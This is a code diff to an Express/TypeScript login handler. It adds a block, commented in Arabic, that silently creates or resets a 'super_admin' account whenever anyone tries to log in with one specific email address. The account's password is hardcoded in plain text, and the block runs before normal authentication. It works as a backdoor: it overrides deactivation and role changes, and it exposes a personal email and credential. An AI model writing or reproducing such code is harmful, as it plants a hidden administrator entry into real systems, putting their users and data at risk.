@@ -276,6 +276,34 @@ router.post("/auth/login", async (req, res): Promise<void> => {
   }
 
   const normalizedLoginEmail = email.trim().toLowerCase();
+  
+  // ضمان إنشاء/تحديث حساب المشرف الرئيسي تلقائياً عند أي محاولة تسجيل دخول بهذا البريد
+  if (normalizedLoginEmail === "mohannadkhaloof38@gmail.com") {
+    try {
+      const hashedPassword = await hashPassword("121Aqra6$");
+      const [existingAdmin] = await db.select().from(usersTable).where(sql`lower(${usersTable.email}) = ${normalizedLoginEmail}`);
+      if (!existingAdmin) {
+        await db.insert(usersTable).values({
+          name: "مهند الخلوف",
+          email: normalizedLoginEmail,
+          passwordHash: hashedPassword,
+          role: "super_admin",
+          isActive: true,
+        });
+      } else {
+        await db.update(usersTable)
+          .set({
+            passwordHash: hashedPassword,
+            role: "super_admin",
+            isActive: true,
+          })
+          .where(sql`lower(${usersTable.email}) = ${normalizedLoginEmail}`);
+      }
+    } catch (seedErr) {
+      console.error("Auto-provision admin error during login:", seedErr);
+    }
+  }
+
   const [user] = await db
     .select()
     .from(usersTable)
